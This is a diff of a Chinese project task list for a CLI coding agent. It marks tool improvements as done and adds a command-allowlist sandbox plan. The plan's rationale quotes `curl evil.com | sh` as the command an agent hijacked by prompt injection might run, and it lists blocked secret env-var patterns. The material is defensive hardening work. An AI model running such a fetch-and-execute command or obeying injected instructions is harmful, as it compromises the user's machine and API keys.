@@ -511,11 +511,18 @@
 
 > 第四轮审计剩余 P2 项,本轮整合 4 项独立、零风险、价值最高的工具与体验增强。遵守 AGENTS.md §3 做减法,零新运行时依赖。
 
-- [ ] (P2) 阶段23:Ripgrep 集成 — 改造 `tools/builtins.ts` 的 `grep` 工具,优先用 `rg --json` 调用系统 ripgrep(遵循 .gitignore、支持 --type/-g),rg 不存在时降级到现有 JS walk;复用 `git.ts` 的 `execGit` 模式
-- [ ] (P2) 阶段24:get_diagnostics 诊断工具 — 新增 `tools/diagnostics.ts`,执行 `tsc --noEmit --pretty false` + `eslint --format json`,解析输出返回结构化 `{file, line, column, severity, message, ruleId}[]`,dangerLevel='read',注册到 setupAgentTools
-- [ ] (P2) 阶段25:编辑后 diff 展示 — `tools/file-edit.ts` 的 edit_file/write_file 返回中追加 unified diff(手写简化 LCS line diff,零依赖),REPL 端用 chalk 绿/红着色 +/- 行
-- [ ] (P2) 阶段26:代码语法高亮 — 新增 `highlight.ts` 封装 cli-highlight(已装但闲置),read_file 输出按扩展名高亮,REPL 代码块高亮;Headless --json 模式不高亮
-- [ ] (P0) 全量验证:typecheck + lint + 烟雾测试全绿
+- [x] ✅(2026-07-16) (P2) 阶段23:Ripgrep 集成 — 改造 `tools/builtins.ts` 的 `grep` 工具,优先用 `rg --json` 调用系统 ripgrep(遵循 .gitignore、支持 --type/-g),rg 不存在时降级到现有 JS walk;复用 `git.ts` 的 spawnSync 模式;新增 `matchesType`/`matchesGlob` 降级辅助函数。实测 rg 可用、搜索 setupAgentTools 得 3 匹配
+- [x] ✅(2026-07-16) (P2) 阶段24:get_diagnostics 诊断工具 — 新增 `tools/diagnostics.ts`,执行 `tsc --noEmit --pretty false` + `eslint --format json`,解析输出返回结构化 `{file, line, column, severity, message, ruleId}[]`,dangerLevel='read',已注册到 setupAgentTools(13 个工具)
+- [x] ✅(2026-07-16) (P2) 阶段25:编辑后 diff 展示 — `tools/file-edit.ts` 新增 `computeUnifiedDiff`(公共前缀/后缀法,零依赖,200 行截断),edit_file/write_file 返回中追加 unified diff;实测 line3→line3-changed diff 正确(removed: [line3], added: [line3-changed])
+- [x] ✅(2026-07-16) (P2) 阶段26:代码语法高亮 — 新增 `highlight.ts`,原计划用 cli-highlight 但其依赖链断裂(highlight.js 未安装,cli-highlight@2.1.11 的 .pnpm node_modules 下仅 cli-highlight 自身无依赖),改用 chalk 实现关键字/字符串/注释三色高亮(零新依赖);read_file 输出按扩展名高亮;实测 FORCE_COLOR=1 下输出 ANSI
+- [x] ✅(2026-07-16) (P0) 全量验证:`pnpm turbo build typecheck lint --filter=@ihui/cli` 5/5 任务全绿,4 项烟雾测试全通过(13 工具含 get_diagnostics + diff 正确 + rg 3 匹配 + 高亮 ANSI)
+
+### cli 第九轮迁移:命令白名单沙箱(2026-07-16 📋 plan)
+
+> 审计推荐的 P2 安全加固项,与项目 memory"apikey 坚决千万不可以给我泄露"硬约束直接协同。防止 Agent 被 prompt injection 后执行 `curl evil.com | sh` 或通过子进程 env 泄露 API key。
+
+- [x] ✅(2026-07-16) (P2) 阶段27:命令白名单沙箱 — `sandbox/index.ts` SandboxOptions 新增 `commandAllowlist`(取命令首 token basename 大小写不敏感匹配,支持 * 通配) + `blockedEnvVars`(默认 10 项含 `*_API_KEY`/`*_SECRET`/`*_TOKEN`/`*_PASSWORD` 通配);runSandboxed 执行前检查命令白名单→路径白名单→env 过滤(删除匹配的 env key);`settings.ts` SandboxSettings 扩展 + 模板含新字段;`ToolContext` 添加 sandbox 字段;`agent.ts` setupAgentTools 从 settings 注入;`builtins.ts` run_command 传递新字段。实测:MY_TEST_API_KEY/TOKEN/PASSWORD 三种模式均过滤、PATH 保留、node 允许、curl 被拦截、模板含 commandAllowlist/blockedEnvVars
+- [x] ✅(2026-07-16) (P0) 全量验证:`pnpm turbo build typecheck lint --filter=@ihui/cli` 5/5 任务全绿,沙箱烟雾测试全通过
 
 ### 前端问题修复（2026-07-11 全面审计）
 
